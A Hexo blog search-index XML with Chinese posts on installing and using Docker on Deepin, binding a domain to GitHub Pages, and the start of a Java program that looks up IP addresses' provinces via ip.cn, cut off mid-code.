<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Docker学习笔记（一）—认识与安装（Deepin15.11）</title>
    <url>/2020/03/15/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E8%AE%A4%E8%AF%86%E4%B8%8E%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="Docker学习笔记（一）"><a href="#Docker学习笔记（一）" class="headerlink" title="Docker学习笔记（一）"></a>Docker学习笔记（一）</h2><h2 id="认识与安装（Deepin15-11）"><a href="#认识与安装（Deepin15-11）" class="headerlink" title="认识与安装（Deepin15.11）"></a>认识与安装（Deepin15.11）</h2><p><em>老早就知道Docker了，但是没有静下心来去看。终于简单的学习了一下，记一下笔记。但是篇幅有点多，分开写吧。</em></p>
<h3 id="1-Docker介绍"><a href="#1-Docker介绍" class="headerlink" title="1.Docker介绍"></a>1.Docker介绍</h3><p>Docker 是一个基于 Go 语言，开源的应用容器引擎。<br>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。<br>容器是完全使用沙箱机制，相互隔离,容器性能开销极低。<br>Docker 从 17.03 版本之后分为 CE（Community Edition: 社区版免费） 和 EE（Enterprise Edition: 企业版收费）。<br>Docker 可以运行在Windows、Mac、Linux(CentOS,Ubuntu等)。<br><a href="https://docs.docker.com/" target="_blank" rel="noopener">官方教程</a></p>
<h3 id="2-Docker架构"><a href="#2-Docker架构" class="headerlink" title="2.Docker架构"></a>2.Docker架构</h3><p><img src="/img/20200315/0.png" alt><br>镜像（Image）：Docker 镜像，就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。<br>容器（Container）：镜像和容器的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。<br>仓库（Repository）：仓库可看作为一个代码控制中心，用来保存镜像。</p>
<p>客户端（client）通过Docker命令与主机（host）的守护进程（daemon）进行通信交互，来创建和管理镜像（images），容器（containers），网络（networks），卷（volumes），插件（plugins）等Docker对象。</p>
<h3 id="3-安装Docker"><a href="#3-安装Docker" class="headerlink" title="3 安装Docker"></a>3 安装Docker</h3><p>不同操作系统方式略有不同，可以参考官方的安装教程。这里基于Deepin15.11（基于官网<a href="https://docs.docker.com/install/linux/docker-ce/debian/" target="_blank" rel="noopener">Debian安装</a>）。<br>卸载旧版本 如果安装旧版本Docker先删除，未安装的话执行下面的命令会提示未安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>

<p>这里使用推荐的仓库安装，更新apt包索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<p>安装 apt 依赖包，用于通过 HTTPS 来获取仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg2 \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure>

<p>添加 Docker 的官方 GPG 密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add –</span><br></pre></td></tr></table></figure>

<p>9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-key fingerprint 0EBFCD88</span><br></pre></td></tr></table></figure>

<p><img src="/img/20200315/1.png" alt></p>
<s>
设置稳定版仓库
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   &quot;deb [arch=amd64] https://download.docker.com/linux/debian \</span><br><span class="line">   $(lsb_release -cs) \</span><br><span class="line">   stable&quot;</span><br></pre></td></tr></table></figure>

<p>这里Deepin可能会报could not find a distribution template for Deepin/stable的错误，需要修改Deepin.info文件的Suite，把unstable改成对应的stable（8jessie 7wheezy 6squeeze）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /usr/share/python-apt/templates/Deepin.info</span><br></pre></td></tr></table></figure>

<p><img src="/img/20200315/2.png" alt></p>
<p>但是更新apt包索引的时候发现仓库里Debian只到wheezy，没有stable<br><img src="/img/20200315/3.png" alt><br></p></s><p></p>
<p>我这里修改stable为wheezy后，apt包索引更新成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/debian wheezy stable&quot;</span><br></pre></td></tr></table></figure>

<s>
要把之前的添加的删除，不然会一直存在在/etc/apt/sources.list里，更新的时候会继续报错
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository -r \</span><br><span class="line">   &quot;deb [arch=amd64] https://download.docker.com/linux/debian \</span><br><span class="line">   $(lsb_release -cs) \</span><br><span class="line">   stable&quot;</span><br></pre></td></tr></table></figure>

</s>

<p>安装社区版<br>更新 apt 包索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<p>安装最新版本的 Docker Engine-Community 和 containerd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<p>验证是否正确安装了Docker（用<code>docker -v</code>来验证也可以）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>

<p>打印出以下信息则安装成功<br><img src="/img/20200315/4.png" alt></p>
<p>配置Docker镜像加速器<br>Docker默认从<a href="https://hub.docker.com/" target="_blank" rel="noopener">Docker Hub</a>上下载Docker镜像，拉取有时会有问题，一般都会配置镜像加速器。各大云都有提供加速器，其他像中科大镜像加速器<code>https://docker.mirrors.ustc.edu.cn/</code>也是可以的。这里使用阿里云的镜像加速器，一般地址为<code>[系统分配前缀].mirror.aliyuncs.com</code>，每个阿里账号对应不同的镜像加速器。首先登陆阿里云，进入容器镜像服务。然后进入镜像加速器菜单，里面有账号对应的加速器地址，并附有各个系统的操作文档，直接复制粘贴过来并回车就行，比如Deepin的参考Ubuntu（基于Debian）的。<br><img src="/img/20200315/5.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://whjf6e0c.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<p>可以通过<code>cat /etc/docker/daemon.json</code>来查看文件是否写入成功。</p>
<h3 id="4-Docker命令"><a href="#4-Docker命令" class="headerlink" title="4 Docker命令"></a>4 Docker命令</h3><p>这里简单写一下部分命令，具体命令写法参数等可以查询官方<a href="https://docs.docker.com/engine/reference/commandline/docker/" target="_blank" rel="noopener">Docker Command</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看服务状态（active：active (running)运行中，inactive (dead)停止）</span><br><span class="line">systemctl status docker</span><br><span class="line">启动/停止/重启服务</span><br><span class="line">systemctl [start|stop|restart] docker</span><br><span class="line">查看服务是否是开机自动启动（Docker装完默认开机启动）</span><br><span class="line">systemctl is-enabled docker</span><br><span class="line">设置/禁止服务开机自动启动</span><br><span class="line">systemctl [enable|disable] docker</span><br><span class="line">查看所有服务的开机自动启动与禁用情况</span><br><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure>

<p>docker命令需要管理员权限<br>查看镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p>REPOSITORY仓库名 TAG版本<br><img src="/img/20200315/6.png" alt></p>
<p>从仓库搜索镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search [镜像名]</span><br><span class="line">docker search mysql</span><br></pre></td></tr></table></figure>

<p>OFFICIAL 带[OK]为官方镜像<br><img src="/img/20200315/7.png" alt></p>
<p>拉取镜像<br>不写版本号为最新版本latest,版本号从Docker Hub上查找<br><img src="/img/20200315/8.png" alt><br>同一行tags是一样的，比如mysql的latest和8是同一个，拉取下来IMAGE ID是一样的<br><img src="/img/20200315/9.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull mysql</span><br><span class="line">docker pull mysql:8</span><br></pre></td></tr></table></figure>

<p>删除镜像<br>被容器使用的镜像无法删除，IMAGE ID有多个一样的无法通过IMAGE ID来删除，可以-f强制删除（未尝试）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi [IMAGE ID镜像id|REPOSITORY仓库名:TAG版本]</span><br><span class="line">docker rmi fce289e99eb9</span><br><span class="line">docker rmi mysql:latest</span><br></pre></td></tr></table></figure>

<p>查看容器<br>COMMAND进入容器初始化的命令 STATUS UP运行，Exited停止</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启动中的容器</span><br><span class="line">docker ps</span><br><span class="line">所有容器</span><br><span class="line">docker ps -a</span><br><span class="line">容器信息</span><br><span class="line">docker inspect [容器名]</span><br></pre></td></tr></table></figure>

<p>创建容器<br>一般参数i（交互模式运行容器，一直运行）和t（为容器重新分配一个伪输入终端）同时使用，创建后直接进入容器，<code>exit</code>退出后会停止。<br><code>-d</code> 后台运行，退出容器不影响运行。<code>-it</code>交互式容器，<code>-id</code>守护式容器<br><code>--name</code> 容器名字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --name=c1 centos:8</span><br><span class="line">docker run -id --name=c2 centos:8</span><br></pre></td></tr></table></figure>

<p>进入容器<br>进入容器后退出，容器不会关闭</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it [容器名] [初始化命令]</span><br><span class="line">docker exec -it c2 /bin/bash</span><br></pre></td></tr></table></figure>

<p><code>exit</code> 退出容器</p>
<p>启动/停止容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker [start|stop] [容器名]</span><br></pre></td></tr></table></figure>

<p>删除容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm [容器ID|容器名]</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker学习笔记（二）-使用</title>
    <url>/2020/03/18/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89-%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="Docker学习笔记（二）-使用"><a href="#Docker学习笔记（二）-使用" class="headerlink" title="Docker学习笔记（二）-使用"></a>Docker学习笔记（二）-使用</h2><p><em>因为不是运维，只是简单了解一下，有一个概念，所以这里写的很简单</em></p>
<h3 id="5-Docker数据卷"><a href="#5-Docker数据卷" class="headerlink" title="5 Docker数据卷"></a>5 Docker数据卷</h3><p>数据卷（Data Volume）是在宿主中可以在容器之间进行共享和重用的一系列和文件和文件夹，为了持久化和共享数据。当数据卷目录挂载到容器目录后，修改会立即同步。容器和数据卷都可以一对多。<br><img src="/img/20200318/1.png" alt><br>配置数据卷<br>创建容器时使用<code>-v</code>参数来挂载数据卷，主机目录不写会默认分配一个目录<br>目录必须是绝对路径，目录不存在会自动创建，可以挂载多个数据卷（多个<code>-v</code>）<br><code>docker run ... -v 主机目录（文件）:容器内目录（文件） ...</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --name=c3 \</span><br><span class="line">    -v /root/data:/root/data \</span><br><span class="line">    -v /root/data2:/root/data2 \</span><br><span class="line">    centos:8</span><br></pre></td></tr></table></figure>

<p>以上数据卷，容器c3，容器c4的目录操作都会同步（共享数据）。删除容器，数据卷的数据还存在（持久化）。<br>通过<code>docker inspect</code>命令查看容器信息，在HostConfig下的Binds（Mounts里也能）查看绑定数据卷信息。</p>
<p>配置数据卷容器<br>通过<code>--volume-from</code>参数配置，可以简化数据配置。容器会直接和数据卷关联，删除数据卷容器不影响下面的容器和数据卷的交互。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --name=cd1 --volumes-from c3 centos:8</span><br></pre></td></tr></table></figure>

<h3 id="6-Docker应用部署"><a href="#6-Docker应用部署" class="headerlink" title="6 Docker应用部署"></a>6 Docker应用部署</h3><p>应用部署一般过程为：搜索镜像，拉取镜像，创建容器。这里以mysql来举例，其他的也差不多，只是容器创建的时候有所不同，比如挂载数据卷之类的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">搜索镜像（版本号需要从Docker Hub上看）</span><br><span class="line">docker search mysql</span><br><span class="line"></span><br><span class="line">拉取镜像</span><br><span class="line">docker pull mysql:8</span><br><span class="line"></span><br><span class="line">创建容器（设置端口映射）</span><br><span class="line">docker run --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -id mysql:8</span><br></pre></td></tr></table></figure>

<p><code>-p 3306:3306</code> 将容器的3306端口映射到主机的3306端口<br><code>-e MYSQL_ROOT_PASSWORD=123456</code> 初始化root用户的密码</p>
<p>远程连接mysql数据库成功<br><img src="/img/20200318/2.png" alt></p>
<h3 id="7-Dockerfile"><a href="#7-Dockerfile" class="headerlink" title="7 Dockerfile"></a>7 Dockerfile</h3><p>Docker镜像由一层一层的文件系统（UnionFS联合文件系统）组成，Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。<br>镜像制作可以通过容器转为镜像<br>容器转镜像（挂载的目录不会写入镜像，root目录下的生效）<br><code>docker commit [容器id] [镜像名称]:[镜像版本号]</code><br>镜像转压缩文件<br><code>docker save -o [压缩文件名称] [镜像名称]:[镜像版本号]</code><br>压缩文件解压（还原）<br><code>docker load -i [压缩文件名称]</code></p>
<p>这里用tomcat来举例，简单创建一个tomcat容器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search tomcat</span><br><span class="line">docker pull tomcat</span><br><span class="line">docker run -id --name mytomcat -p 8080:8080 -v /root/tomcat:/usr/local/tomcat/webapps tomcat</span><br><span class="line">cd /root/tomcat/</span><br><span class="line">mkdir HelloWorld</span><br><span class="line">cd HelloWorld/</span><br><span class="line">vim index.html</span><br><span class="line">写入&lt;h1&gt;Hello World By Docker&lt;/h1&gt;</span><br></pre></td></tr></table></figure>

<p>通过url访问<br><img src="/img/20200318/3.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">容器转镜像</span><br><span class="line">docker commit e3bb40626a58 myimg_tomcat:1.0</span><br><span class="line">进入容器</span><br><span class="line">docker exec -it myimg_tomcat bash</span><br><span class="line">镜像转压缩文件</span><br><span class="line">docker save -o myimg_tomcat.tar myimg_tomcat:1.0</span><br><span class="line">删除原镜像</span><br><span class="line">docker rmi myimg_tomcat:1.0</span><br><span class="line">压缩文件解压（还原）</span><br><span class="line">docker load -i myimg_tomcat.tar</span><br><span class="line">创建新容器</span><br><span class="line">docker run -it --name load_tomcat  myimg_tomcat:1.0 bash</span><br><span class="line">容器内查看webapps目录，原来挂载文件消失</span><br><span class="line">cd /usr/local/tomcat/webapps</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>推荐使用dockerfile来创建自定义镜像<br>书写可以参考Docker Hub上面的Dockerfile文件的写法或者<a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/" target="_blank" rel="noopener">官方文档</a>，这里简单列一下关键字。<br><code>FROM</code> 基于那个image构建（scratch为空镜像）<br><code>LABEL</code> 一些标签说明<br><code>RUN</code> 执行命令，在docker build时运行<br><code>CMD</code> 类似RUN，在docker run时运行，可被 docker run 命令行参数中指定要运行的程序所覆盖<br><code>ENTRYPOINT</code> 类似CMD，但其不会被 docker run 的命令行参数指定的指令所覆盖<br><code>EXPOSE</code> 声明端口<br><code>ENV</code> 设置环境变量<br><code>ARG</code> 类似ENV，环境变量仅对 Dockerfile 内有效<br><code>COPY</code> 复制文件或者目录到容器里指定路径<br><code>ADD</code> 类似COPY，同样功能推荐用COPY，ADD可以自动解压压缩文件到目标路径<br><code>VOLUME</code> 定义匿名数据卷<br><code>USER</code> 指定执行后续命令的用户和用户组<br><code>WORKDIR</code> 指定工作目录<br><code>ONBUILD</code> 延迟构建命令的执行<br><code>LABEL</code> 标签<br><code>MAINTAINER</code> 作者信息<br><code>HEALTHCHECK</code> 健康检查<br><code>SHELL</code> 指定执行脚本的shell</p>
<p>使用Dockerfile创建镜像<br><code>docker build -f [Dockerfile路径] -t [镜像名]</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里新建Dockerfile文件来创建镜像</span><br><span class="line">vim tomcat_dockerfile</span><br><span class="line">写入</span><br><span class="line">FROM tomcat:latest</span><br><span class="line">MAINTAINER xuchl&lt;xuchl@xuchunlei.top&gt;</span><br><span class="line"></span><br><span class="line">WORKDIR /usr/local/tomcat/webapps</span><br><span class="line">RUN mkdir HelloWorld</span><br><span class="line">WORKDIR /usr/local/tomcat/webapps/HelloWorld</span><br><span class="line">RUN echo &quot;&lt;h1&gt;Tomcat From Dockerfile&lt;/h1&gt;&quot; &gt; index.html</span><br><span class="line"></span><br><span class="line">创建镜像</span><br><span class="line">docker build -f ./tomcat_dockerfile  -t dcfile_tomcat:1.0 .</span><br></pre></td></tr></table></figure>

<p><img src="/img/20200318/5.png" alt><br>用Dockerfile Build镜像时Docker client会默认把Dockerfile同级所有文件发给docker Deamon中导致发送内容过大。<br><img src="/img/20200318/4.png" alt><br>可以新建一个空目录放Dockerfile文件，或者使用.dockerignore文件设置黑名单，该文件包含的目录不会被发送到Docker daemon中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">创建容器</span><br><span class="line">docker run --name dcc -p 8080:8080 -d dcfile_tomcat:1.0</span><br></pre></td></tr></table></figure>

<p>通过url访问<br><img src="/img/20200318/6.png" alt></p>
<h3 id="8-Docker服务编排"><a href="#8-Docker服务编排" class="headerlink" title="8 Docker服务编排"></a>8 Docker服务编排</h3><p>Compose是用于定义和运行多容器Docker应用程序的工具，Compose具有用于管理应用程序整个生命周期的命令，包括启动，停止和重建服务等。</p>
<blockquote>
<p>步骤<br>1 使用Dockerfile定义应用环境，以便可以在任何地方复制。<br>2 使用docker-compose.yml定义组成应用程序服务，以便它们可以在隔离的环境中一起运行。<br>3 运行 docker-compose up启动并运行整个应用程序。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装Docker Compose的当前稳定版本（下了几次失败，换了国内的地址秒好）</span><br><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.4/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">设置文件可执行权限</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">查看版本信息来验证是否安装成功</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>

<p>简单写一个yml启动的例子（进入容器内加的页面），关键字就不（偷）解释（懒）了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir composeHelloWorld</span><br><span class="line">cd composeHelloWorld/</span><br><span class="line"></span><br><span class="line">vim docker-compose.yml</span><br><span class="line"></span><br><span class="line">version: &apos;3&apos;</span><br><span class="line">services:</span><br><span class="line">  tomcat:</span><br><span class="line">    image: tomcat</span><br><span class="line">    ports:</span><br><span class="line">     - &quot;8090:8080&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/img/20200318/7.png" alt></p>
<h3 id="9-Docker私有仓库"><a href="#9-Docker私有仓库" class="headerlink" title="9 Docker私有仓库"></a>9 Docker私有仓库</h3><p>私有仓库registry是一个官方提供的镜像。这里仓库放在本机，实际上是要放到不同机器上的。<br>搭建</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">拉取仓库镜像</span><br><span class="line">docker pull registry</span><br><span class="line">创建容器并启动</span><br><span class="line">docker run -id --name registry -p 5000:5000 registry</span><br></pre></td></tr></table></figure>

<p>访问<code>http://私库ip地址:5000/v2</code>出现<code>{}</code>说明运行正常</p>
<p>上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">标记镜像</span><br><span class="line">docker tag centos:8 localhost:5000/centos:8</span><br><span class="line"></span><br><span class="line">推送镜像</span><br><span class="line">docker push localhost:5000/centos:8</span><br></pre></td></tr></table></figure>

<p><img src="/img/20200318/8.png" alt><br>访问<code>http://私库ip地址:5000/v2/_catalog</code>出现<code>{&quot;repositories&quot;:[&quot;centos&quot;]}</code>说明上传成功</p>
<p>拉取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">拉取镜像</span><br><span class="line">docker pull localhost:5000/centos:8</span><br></pre></td></tr></table></figure>

<p><img src="/img/20200318/9.png" alt><br>这里因为是本机，需要先删除才能拉取下来。</p>
<p>Docker官方提供的私有仓库registry虽然简单但在管理上存在不足。可以通过<a href="https://github.com/goharbor/harbor" target="_blank" rel="noopener">Harbor</a>来弥补以上不足（这里只提一下）。</p>
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub Pages绑定域名</title>
    <url>/2019/11/08/GitHub-Pages%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D/</url>
    <content><![CDATA[<h1 id="GitHub-Pages绑定域名"><a href="#GitHub-Pages绑定域名" class="headerlink" title="GitHub Pages绑定域名"></a>GitHub Pages绑定域名</h1><blockquote>
<h4 id="准备-申请域名"><a href="#准备-申请域名" class="headerlink" title="准备 申请域名"></a>准备 申请域名</h4></blockquote>
<p>老早就想申请一个域名了，和GitHub的用户名一样，可选的也不是很多。个人用的话推荐.top顶级域名，便宜（万网相对便宜吧，续费每年26￥）。<br>然后我是新用户，首年1元就可以（有的首次开通便宜，可以多买几年）。<br>大部分顶级域名国内都需要实名认证，一般2到3个工作日审核。我早上申请的，过了一会域名就实名通过了，可以进行解析了。</p>
<blockquote>
<h4 id="GitHub仓库配置"><a href="#GitHub仓库配置" class="headerlink" title="GitHub仓库配置"></a>GitHub仓库配置</h4></blockquote>
<p>xxx.github.io仓库 &gt; Settings &gt; Custom domain中写入申请的域名 &gt; Save<br><a href="https://help.github.com/en/github/working-with-github-pages/managing-a-custom-domain-for-your-github-pages-site" target="_blank" rel="noopener">官方文档</a></p>
<blockquote>
<h4 id="添加域名解析"><a href="#添加域名解析" class="headerlink" title="添加域名解析"></a>添加域名解析</h4></blockquote>
<ul>
<li><p>获取GitHub Pages域名：ping自己的地址xxx.github.io，获取到ip</p>
</li>
<li><p>添加域名解析：可以加两条A类型的，一条www，一条@。</p>
</li>
</ul>
<p>过一段时间就能访问了</p>
<blockquote>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4></blockquote>
<p>以下主题限定<br>从 xxx.github.io 到新域名，需要更改Hexo的url配置，这样对应的主页地址才能更改。<br>Gitalk的Homepage URL和Authorization callback URL也要修改。<br>顺便删掉了部分代码，去掉谷歌403错误（疑似广告）<br>音乐本地话，去除”A cookie associated with a cross-site resourced……”警告</p>
<p>p.s：新建这篇文章发现，名字中如果有空格需要加引号，不然空格前面的就会忽略掉（即《Pages绑定域名》）。加上引号，生成的文件名空格会被-替代。</p>
]]></content>
      <tags>
        <tag>博客</tag>
        <tag>GitHub Pages</tag>
        <tag>域名</tag>
      </tags>
  </entry>
  <entry>
    <title>IP地址分布分析(国内)</title>
    <url>/2020/04/02/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90(%E5%9B%BD%E5%86%85)/</url>
    <content><![CDATA[<h2 id="IP地址分布分析-国内"><a href="#IP地址分布分析-国内" class="headerlink" title="IP地址分布分析(国内)"></a>IP地址分布分析(国内)</h2><p><em>因为工作的原因，简单整理了一下，效率极低，娱乐用</em></p>
<h3 id="ip所在地来源"><a href="#ip所在地来源" class="headerlink" title="ip所在地来源"></a>ip所在地来源</h3><p>因为第一次做这个，没弄数据库和根据ip段来判断，直接请求<a href="https://ip.cn/" target="_blank" rel="noopener">ip.cn</a>，通过jsoup来获取页面数据。发现GeoIP数据不是很准确，基本以页面<code>所在地理位置</code>的数据为准，在获取不到准确数据的情况下参考页面<code>GeoIP</code>数据。<br>请求是最影响效率的地方，基本每秒请求一次，偶尔会报错（超时，520之类），毕竟是免费的。实际上分析的时候用的多线程（500条为一组），把没获取全的数据单独执行获取，然后在Excel表格里手动修改错误数据，然后整理计算。<br><img src="/img/20200402/1.png" alt></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>后来（工作完成后）根据获取数据的规律，简单写了下（渣）代码，基本就是读取ip，获取ip所在省份，ip所在省份加一。执行错误，或者有无法识别的IP（国外，本地，特殊IP等）需要手动判断。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.net.SocketException;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.LinkedHashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.lang3.StringUtils;</span><br><span class="line">import org.jsoup.Connection;</span><br><span class="line">import org.jsoup.Jsoup;</span><br><span class="line">import org.jsoup.nodes.Document;</span><br><span class="line">import org.jsoup.select.Elements;</span><br><span class="line"></span><br><span class="line">public class IpDistributionCreater &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String args[]) &#123;</span><br><span class="line">//		String[] ips = &#123; &quot;116.116.91.150&quot;, // 正常内蒙古</span><br><span class="line">//				&quot;127.0.0.1&quot;, // 本地</span><br><span class="line">//				&quot;172.58.22.176&quot;, // 美国</span><br><span class="line">//				&quot;223.104.212.147&quot;, // geoip上海</span><br><span class="line">//				&quot;223.104.148.122&quot;, // geoip江苏</span><br><span class="line">//				&quot;47.75.7.133&quot; &#125;; // 正常香港</span><br><span class="line">//		ipDistributionCreater(ips);</span><br><span class="line">	</span><br><span class="line">		// 数据量大时从文件读取</span><br><span class="line">		List&lt;String&gt; ipList = new ArrayList&lt;String&gt;();</span><br><span class="line">		try &#123;</span><br><span class="line">			BufferedReader br = new BufferedReader(new FileReader(&quot;D:\\ips.txt&quot;));</span><br><span class="line">			String lineStr = &quot;&quot;;</span><br><span class="line">			while ((lineStr = br.readLine()) != null) &#123;</span><br><span class="line">				ipList.add(lineStr);</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(&quot;读取&quot; + ipList.size() + &quot;条IP&quot;);</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		String[] ips = &#123;&#125;;</span><br><span class="line">		ipDistributionCreater(ipList.toArray(ips));</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static void ipDistributionCreater(String ips[]) &#123;</span><br><span class="line">		Map&lt;String, Integer&gt; provinceMap = new LinkedHashMap&lt;String, Integer&gt;();</span><br><span class="line">		provinceMap.put(&quot;北京&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;天津&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;上海&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;重庆&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;河北&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;河南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;云南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;辽宁&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;黑龙&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;黑龙江&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;湖南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;安徽&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;山东&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;新疆&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;江苏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;浙江&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;江西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;湖北&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;广西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;甘肃&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;山西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;内蒙&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;内蒙古&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;陕西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;吉林&quot;, 0);</span><br><span 